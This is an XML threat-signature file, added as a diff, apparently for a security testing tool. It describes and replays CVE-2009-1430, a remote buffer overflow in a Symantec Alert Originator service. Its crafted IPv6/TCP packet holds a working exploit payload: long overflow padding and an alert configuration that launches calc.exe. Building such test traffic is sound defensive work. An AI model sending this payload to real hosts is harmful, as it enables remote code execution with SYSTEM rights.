@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Symantec Alert Management System Intel Alert Originator Service Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in Symantec Alert Originator Service component shipped with Symantec Client Security software. The vulnerability is due to a boundary error in iao.exe while copying user-provided data into memory. This can be exploited by remote unauthenticated attackers to inject and execute arbitrary code on the target host.            In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected process, which is SYSTEM on Windows platform.            In an attack case where code injection is not successful, the affected process will terminate abnormally. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="TCP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Symantec"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Symantec_Symantec_Client_Security"/>
+      <item value="Symantec_Symantec_AntiVirus_Corporate_Edition"/>
+      <item value="Symantec_Symantec_Endpoint_Protection"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Symantec_Client_Security_2.0.x_prior_to_2.0_MR7"/>
+      <item value="Symantec_Client_Security_3.x_prior_to_3.1_MR8"/>
+      <item value="Symantec_AntiVirus_Corporate_Edition_9.0.x_prior_to_9.0_MR7"/>
+      <item value="Symantec_AntiVirus_Corporate_Edition_10.x_prior_to_10.1_MR8"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20090430-02"/>
+    <CVEID display="true" value="CVE-2009-1430"/>
+    <bugtraqID display="true" value="34672"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="44f330c6b80d673efc1ad3951978e881"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1249419598"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1249420520" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="K"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="L"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="95ED60AE" AckNumber="8ACEA6CB" HeaderLength="08" WindowSize="002E" Checksum="F7FE" UrgentPointer="0000" Options="0101080A95CB446600000000" Payload="FFFFFFFFFFFFFFFF000002009594AC1008B40000000000000000410500004F524947434E4647100000000000000004000303B86000000000000042494E44000000000000000000000000030000000442494E44000E0044656661756C7420416C65727400FF0353796D616E74656320416E7469566972757320436F72706F726174652045646974696F6E41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410000000001505247580004AC10081D07081200436F6E66696775726174696F6E4E616D650016001400633A5C77696E646F77735C63616C632E65786500080C00436F6D6D616E644C696E650016001400633A5C77696E646F77735C63616C632E6578650008080052756E41726773000400020020000305004D6F6465000400010000000A0D00466F726D6174537472696E670002000000081200436F6E66696775726174696F6E4E616D650002000000080C0048616E646C6572486F737400170015006468637032392E7672742E74656C75732E636F6D000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
